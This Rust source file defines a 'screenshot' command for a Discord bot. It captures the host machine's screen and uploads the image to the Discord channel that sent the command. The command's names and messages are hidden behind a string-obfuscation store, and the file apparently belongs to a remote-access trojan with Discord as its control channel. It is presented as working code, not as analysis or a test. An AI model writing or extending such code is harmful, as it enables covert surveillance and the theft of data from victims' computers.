use crate::commands::*;
use crate::core::stego_store::{StegoStore, StringCategory};
use std::boxed::Box;
use serde_json;
use crate::core::screenshot::Screenshot;
use anyhow::Result;
use async_trait::async_trait;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;


pub struct ScreenshotCommand;

impl ScreenshotCommand {
    fn m(key: &str) -> String { StegoStore::get(StringCategory::Msg, key) }
    fn c(key: &str) -> String { StegoStore::get(StringCategory::CmdMeta, key) }
}

#[async_trait]
impl BotCommand for ScreenshotCommand {
    fn name(&self) -> &str {
        Box::leak(Self::c("SCREENSHOT_NAME").into_boxed_str())
    }
    
    fn description(&self) -> &str {
        Box::leak(StegoStore::get(StringCategory::Desc, "SCREENSHOT").into_boxed_str())
    }
    
    fn category(&self) -> &str {
        Box::leak(Self::c("CAT_UTIL").into_boxed_str())
    }
    
    fn usage(&self) -> &str {
        Box::leak(Self::c("SCREENSHOT_USAGE").into_boxed_str())
    }
    
    fn examples(&self) -> &'static [&'static str] {
        Box::leak(vec![".screenshot"].into_boxed_slice())
    }
    
    fn aliases(&self) -> &'static [&'static str] {
        Box::leak(vec![
            Box::leak(Self::c("SCREENSHOT_ALIAS1").into_boxed_str()) as &'static str,
            Box::leak(Self::c("SCREENSHOT_ALIAS2").into_boxed_str()) as &'static str,
        ].into_boxed_slice())
    }

    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, _args: Arguments) -> Result<()> {
        let thinking_msg_json = http
            .create_message(msg.channel_id.into(), &Self::m("CAPTURING_SCREEN")).await?;
        let thinking_msg: Message = serde_json::from_str(&thinking_msg_json)?;

        match Screenshot::capture_as_bytes() {
            Ok((bytes, filename)) => {
                http.create_message_with_file(
                    msg.channel_id.into(),
                    &Self::m("SCREENSHOT_OK").replace("{}", &filename),
                    &bytes,
                    &filename
                ).await?;
                let _ = http.delete_message(thinking_msg.channel_id, thinking_msg.id).await;
            }
            Err(e) => {
                http.update_message(thinking_msg.channel_id, thinking_msg.id, Some(Self::m("ERR_SCREENSHOT").replace("{}", &e.to_string()))).await?;
            }
        }

        Ok(())
    }
}


